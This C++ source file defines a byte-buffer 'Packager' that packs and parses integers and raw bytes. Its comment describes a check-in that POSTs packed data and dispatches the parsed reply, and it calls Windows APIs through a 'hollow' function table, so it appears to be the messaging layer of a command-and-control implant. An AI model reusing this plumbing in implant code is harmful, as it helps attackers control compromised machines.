#include "../../includes/byte/byte.h"
#include "../../includes/core/core.h"
#include "../../includes/utils/utils.h"




/*
	core.cc -> Checkin() -> this just POSTs packager->PackerPointer + size -> Net manager checks if data, reads into packager->NewParser() -> core.cc calls Dispatch() 
*/


BOOL Packager::NewParser(PBYTE data, INT32 size) {
	if (!data) { return FALSE; }
	this->ReadBuf = data;
	this->ReadBufSize = size;
	this->ReadIndex = 0;
	return TRUE;
}


INT32 Packager::Parse4() {
	INT32 val = 0;
	if (this->ReadIndex + sizeof(INT32) > this->ReadBufSize) { return -1; }
	utils::mem::memcpy(&val, this->ReadBuf + this->ReadIndex, sizeof(INT32));
	this->ReadIndex += sizeof(INT32);
	return val;
}

BOOL Packager::ParseBytes(void* out, INT32 len) {
	if (this->ReadIndex + len > this->ReadBufSize) { return FALSE; }
	utils::mem::memcpy(out, this->ReadBuf + this->ReadIndex, len);
	this->ReadIndex += len;
	return TRUE;
}







BOOL Packager::EnsureBuf(SIZE_T Needed) {
	if (!this->WriteBuf) { return FALSE; }
	if (Needed <= this->WriteBufSize) { return TRUE; }

	SIZE_T NewSize = this->WriteBufSize ? this->WriteBufSize : BASE_WRITER_SIZE;
	do {
		if (NewSize > ((SIZE_T)-1) / 2) { return FALSE; }
		NewSize *= 2;
	} while (NewSize < Needed);

	HLOCAL NewBuf = hollow->Win32.LocalReAlloc(this->WriteBuf, NewSize, LMEM_FIXED | LMEM_ZEROINIT);
	if (!NewBuf) { return FALSE; }

	this->WriteBuf = (PBYTE)NewBuf;
	this->WriteBufSize = NewSize;
	return TRUE;
}

BOOL Packager::NewPacker() {
	if (this->WriteBuf) { return FALSE; }

	PBYTE Addr = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, BASE_WRITER_SIZE);
	if (!Addr) { return FALSE; }
	this->WriteBuf = Addr;
	this->WriteIndex = 0;
	this->WriteBufSize = BASE_WRITER_SIZE;
	return TRUE;
}

BOOL Packager::Pack4(INT32 val) {
	if (!this->WriteBuf) { return FALSE; }

	if (!this->EnsureBuf(this->WriteIndex + sizeof(val))) { return FALSE; }

	utils::mem::memcpy(this->WriteBuf + this->WriteIndex, &val, sizeof(val));

	this->WriteIndex += sizeof(val);
	return TRUE;
}

BOOL Packager::PackBytes(PBYTE Data, INT32 len) {
	if (!this->WriteBuf || !Data || len < 0) { return FALSE; }

	if (!this->EnsureBuf(this->WriteIndex + (SIZE_T)len)) { return FALSE; }

	utils::mem::memcpy(this->WriteBuf + this->WriteIndex, Data, len);
	this->WriteIndex += len;
	return TRUE;
}

BOOL Packager::DeletePacker() {
	if (!this->WriteBuf) { return FALSE; }

	hollow->Win32.LocalFree(this->WriteBuf);
	this->WriteBuf = NULL;
	this->WriteIndex = 0;
	this->WriteBufSize = 0;
	return TRUE;
}

PBYTE Packager::PackerPointer() {
	return this->WriteBuf;
}

INT32 Packager::PackerSize() {
	return (INT32)this->WriteIndex;
}

void Packager::ResetPacker() {
	this->WriteIndex = 0;
}

Packager* packager = NULL;
